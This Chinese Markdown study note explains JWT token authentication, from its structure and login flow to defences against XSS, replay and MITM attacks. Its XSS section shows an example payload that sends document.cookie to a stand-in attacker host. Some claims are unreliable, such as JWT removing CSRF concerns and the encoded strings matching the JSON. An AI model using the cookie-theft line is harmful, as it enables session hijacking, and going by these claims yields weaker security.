<!--
 * @Description: 深入浅出基于JWT的Token认证
 * @Date: 2019-08-12 15:27:08
 * @LastEditors: phoebus
 * @LastEditTime: 2019-08-13 11:49:02
 -->
# 深入基于JWT的Token认证

## 概述

> [常见登陆认证方式](知识笔记/大前端/前端安全/登录认证/常见登陆认证方式.md)

#### 前言

* 首先，其实对于开发来说token认证更重于第三方认证，毕竟第三方认证是别人的，虽然我们得会，但是大部分公司其实都希望建立自己稳定的用户群体，也就是希望用户注册账号，而token认证就是当代流行的解决方案

* 其次一般我们将 `token认证` 跟别的认证方式比较一般就是 `cookie认证` ，第三方只能说是补充，一种便捷的登录信息授权方案，本质上还是以 `token认证` (或更好的认证)为基础

* 最后看看 `Cookie认证机制` 的优劣：[常见登陆认证方式](知识笔记/大前端/前端安全/登录认证/常见登陆认证方式.md)

> 简单的说， `Cookie认证机制` 已经过时了，现在移动互联网时代，各种场景问题层出不穷， `Cookie认证机制` 存在一些比较不方便且不安全的问题让我寻求更好更方便的认证机制，而 `token认证` 就是更好的， `第三方认证` 就是更方便的

#### Token Auth的优劣

**Token机制相对于Cookie机制又有什么好处呢？**

* 支持跨域访问

	Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输.

* 无状态(也称：服务端可扩展行)

	Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息.

* 更适用CDN

	可以通过内容分发网络请求我们服务端的所有资料（如：javascript，HTML,图片等），而我们的服务端只要提供API即可.

* 去耦

	不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在我们的API被调用的时候，我们可以进行Token生成调用即可.

* 更适用于移动应用

	当我们的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（我们需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。

* CSRF

	因为不再依赖于Cookie，所以我们就不需要考虑对CSRF（跨站请求伪造）的防范。

* 性能

	一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算 的Token验证和解析要费时得多.

* 不需要为登录页面做特殊处理

	如果我们使用Protractor 做功能测试的时候，不再需要为登录页面做特殊处理.

* 基于标准化

	我们的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）

## 基于JWT的Token认证机制实现

	JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息

#### JWT的组成

	一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名

###### 载荷（Payload）

``` js
{
    "iss": "Online JWT Builder",	// JWT的签发者，可选
    "iat": 1416797419,	// issued at)，在什么时候签发的(UNIX时间)，可选
    "exp": 1448333419,	// expires)，什么时候过期，这里是一个Unix时间戳，可选
    "aud": "www.example.com",	// 接收该JWT的一方，可选
    "sub": "phoebus@example.com",	// JWT所面向的用户，可选
    "GivenName": "Johnny",
    "Surname": "Rocket",
    "Email": "phoebus@example.com",
    "Role": ["Manager", "Project Administrator"],
}
```

> 还有nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，可选

* 将上面的JSON对象进行`[base64编码]`可以得到下面的字符串，这个字符串我们将它称作JWT的Payload（载荷）

``` bash
eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9
```

###### 头部（Header）

	JWT还需要一个头部，头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等，可以使用JSON对象表示

``` js
{
	"typ": "JWT",
	"alg": "HS256"	// 这里标明了 HS256算法
}
```

* 当然，这也要进行`base64编码`

``` bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

###### 签名（Signature）

* 将`头部.载荷`用点号连在一起后

``` bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0
```

* 然后将拼接完的字符串使用对应的算法(这里是`HS256算法`)进行加密，在加密的时候，我们还需要提供一个密钥（secret）。如果我们用`mystar`作为密钥的话，那么就可以得到我们加密后的内容

``` bash
rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM
```

* 最后将这部分标签通过`头部.载荷.签名`进行拼接，就可以得到`完整的JWT`

``` bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM
```

* 而我们的请求的URL上就会带有这个JWT字符串

``` bash
https://your.awesome-app.com/make-friend/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM
```

#### JWT认证过程

###### 登录

* 第一次认证：第一次登录，用户从浏览器输入用户名/密码，提交后到服务器的登录处理的Action层（Login Action）；

* Login Action调用认证服务进行用户名密码认证，如果认证通过，Login Action层调用用户信息服务获取用户信息（包括完整的用户信息及对应权限信息）

* 返回用户信息后，Login Action从配置文件中获取Token签名生成的秘钥信息，进行Token的生成；

* 生成Token的过程中可以调用第三方的JWT Lib生成签名后的JWT数据；

* 完成JWT数据签名后，将其设置到COOKIE对象中，并重定向到首页，完成登录过程。

![JWT登录过程](../images/JWT登录过程.png)

> 一般第一次登录会带上JWT信息，而服务端进过JWT生产token后设置到响应头cookie中(可以设置有效时间，也不一定在cookie中)，以后每次请求验证响应头的token值就行

###### 请求认证

	基于Token的认证机制会在每一次请求中都带上完成签名的Token信息，这个Token信息可能在COOKIE中，也可能在HTTP的Authorization头中

> 一般是在cookie中，但其实并不限于cookie，因为JWT规范只是一种实现方案，具体实现可以不同，但实际效果是差不多的，可能是看场景需求

* 客户端（APP客户端或浏览器）通过GET或POST请求访问资源（页面或调用API）；

* 认证服务作为一个Middleware HOOK 对请求进行拦截，首先在cookie中查找Token信息，如果没有找到，则在HTTP Authorization Head中查找；

* 如果找到Token信息，则根据配置文件中的签名加密秘钥，调用JWT Lib对Token信息进行解密和解码；

* 完成解码并验证签名通过后，对Token中的exp、nbf、aud等信息进行验证；

* 全部通过后，根据获取的用户的角色权限信息，进行对请求的资源的权限逻辑判断；

* 如果权限逻辑判断通过则通过Response对象返回；否则则返回HTTP 401

![JWT请求认证图](../images/JWT请求认证图.png)

#### 关于token认证机制

* 一个Token就是一些信息的集合；

	* 这是JWT规范，它的实现就是通过token保存足够的验证信息，从而最大限度的减少数据库连接查询，本质上token就是数据集

* 在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；

	* 使用token的目的之一就是要减少数据库连接查询操作，减少服务端资源消耗，而在token中放有足够的验证信息也是为了无状态性，服务端不用记忆，每次直接校验token就行

* 服务端需要对cookie和HTTP Authorization Header进行Token信息的检查；

	* 这是对token放置位置的实现，现实实现token可能不止这些，因为可能要考虑非浏览器端等方面，而浏览器方面我们可以直接放在`cookie`或`Authorization Header`中

* 基于上一点，我们可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；

* 因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的

> token认证实现其实主要是后端实现，包括生成token、解码和验证等，前端基本没啥工作要做，所以看[JWT的JAVA实现](https://www.cnblogs.com/xiekeli/p/5607107.html)

## 基于JWT的Token认证的安全问题

	JWT的Token认证这只是让我们的验证十分方便而已，实际上还有很多安全问题我们需要另外考虑，例如首次用户名密码验证安全性、防范各种攻击等

> 当然，JWT规范本质上是方便我们做认证，只是方面而已，具体实现过程的漏洞还需要我们补上，所有的问题都是为了解决人为的问题

#### 认证过程的安全性

	首先，第一次认证的时候是需要账号密码登录验证的，在这个过程这些私密的信息需要在网络中传输，那就存着泄露(被拦截)的风险，这个问题我们需要确保认证通道的安全性

**解决方案**

* 在认证的过程使用`HTTPS`传输协议，通过`SSL加密传输`

	这样传输能极大的保障传输通道的安全性

#### 防范XSS攻击

	浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)

* 如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码

``` html
<img src="x" /> a.src='https://hackmeplz.com/yourCookies.png/?cookies=’
+document.cookie;return a}())"
```

> 这段代码会盗取我们域中的`所有cookie信息`，并发送到 `hackmeplz.com`

###### 如何来防范这种攻击呢？

* XSS攻击代码过滤

	* 移除任何会导致浏览器做非预期执行的代码
	
		这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果我们是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），我们需要在前端和服务端分别做过滤
	
* 采用HTTP-Only Cookies

	通过设置Cookie的参数：`HttpOnly; Secure` 来防止通过JavaScript 来访问Cookie；

> [认识XSS攻击与防范](知识笔记/大前端/前端安全/XSS攻击/认识XSS攻击与防范.md)

#### 防范Replay攻击

	所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程

* 比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取

	即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的

**对应解决方案**

* 时间戳 + 共享秘钥

	* 这种方案，客户端和服务端都需要知道：

		* User ID
		* 共享秘钥
	
*客户端*

``` js
auth_header = JWT.encode({
  user_id: 123,
  iat: Time.now.to_i,      // 指定token发布时间
  exp: Time.now.to_i + 2   // 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；
}, "<my shared secret>")
RestClient.get("http://api.example.com/", authorization: auth_header)
```

*服务端*

``` php
class ApiController < ActionController::Base
  attr_reader :current_user
  before_action :set_current_user_from_jwt_token

  def set_current_user_from_jwt_token
    # Step 1:解码JWT，并获取User ID，这个时候不对Token签名进行检查
    # the signature. Note JWT tokens are *not* encrypted, but signed.
    payload = JWT.decode(request.authorization, nil, false)

    # Step 2: 检查该用户是否存在于数据库
    @current_user = User.find(payload['user_id'])
    
    # Step 3: 检查Token签名是否正确.
    JWT.decode(request.authorization, current_user.api_secret)
    
    # Step 4: 检查 "iat" 和"exp" 以确保这个Token是在2秒内创建的.
    now = Time.now.to_i
    if payload['iat'] > now || payload['exp'] < now
      # 如果过期则返回401
    end
  rescue JWT::DecodeError
    # 返回 401
  end
end
```

* 时间戳 +共享秘钥+黑名单 （类似Zendesk的做法）

*客户端*

``` js
auth_header = JWT.encode({
  user_id: 123,
  jti: rand(2 << 64).to_s,  // 通过jti确保一个token只使用一次，防止replace attack
  iat: Time.now.to_i,       // 指定token发布时间.
  exp: Time.now.to_i + 2    // 指定token过期时间为2秒后
}, "<my shared secret>")
RestClient.get("http://api.example.com/", authorization: auth_header)
```

*服务端*

``` php
def set_current_user_from_jwt_token
  # 前面的步骤参考上面
  payload = JWT.decode(request.authorization, nil, false)
  @current_user = User.find(payload['user_id'])
  JWT.decode(request.authorization, current_user.api_secret)
  now = Time.now.to_i
  if payload['iat'] > now || payload['exp'] < now
    # 返回401
  end
  
  # 下面将检查确保这个JWT之前没有被使用过
  # 使用Redis的原子操作
  
  # The redis 的键: <user id>:<one-time use token>
  key = "#{payload['user_id']}:#{payload['jti']}"
  
  # 看键值是否在redis中已经存在. 如果不存在则返回nil. 如果存在则返回“1”. .
  if redis.getset(key, "1")
    # 返回401
    # 
  end
  
  # 进行键值过期检查
  redis.expireat(key, payload['exp'] + 2)
end
```

> [认识Replay攻击与防范](知识笔记/大前端/前端安全/Replay攻击/认识Replay攻击与防范.md)

#### 防范MITM （Man-In-The-Middle）Attacks

	所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等

> 针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的。

> [认识MITM攻击与防范](知识笔记/大前端/前端安全/MITM攻击/认识MITM攻击与防范.md)

> 参考：[基于Token的WEB后台认证机制](https://www.cnblogs.com/xiekeli/p/5607107.html)
